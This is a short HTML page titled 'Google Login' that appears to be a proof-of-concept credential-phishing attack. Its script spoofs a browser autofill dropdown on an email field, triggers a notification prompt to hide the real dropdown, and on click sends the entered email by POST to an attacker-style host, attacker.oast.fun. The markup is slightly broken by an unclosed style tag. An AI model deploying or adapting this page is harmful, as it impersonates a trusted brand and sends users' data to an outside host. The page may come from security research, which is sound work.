<!DOCTYPE html>
<html>
<head>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Google Login</title>
  <style>
<body>

<input type="email" id="email" autocomplete="email" />
<div id="fakeDropdown"> <!-- spoofed autofill entries --> </div>
<script>
  email.onfocus = () => {
    setTimeout(() => {
      Notification.requestPermission(); // Suppress native autofill dropdown
      fakeDropdown.style.display = 'block';
    }, 150);
  };

  fakeDropdown.onclick = () => {
    setTimeout(() => {
      fetch('https://attacker.oast.fun', {
        method: 'POST',
        body: JSON.stringify({ email: email.value })
      });
    }, 500); // cukup waktu autofill berjalan
  };
</script>


</body>
</html>
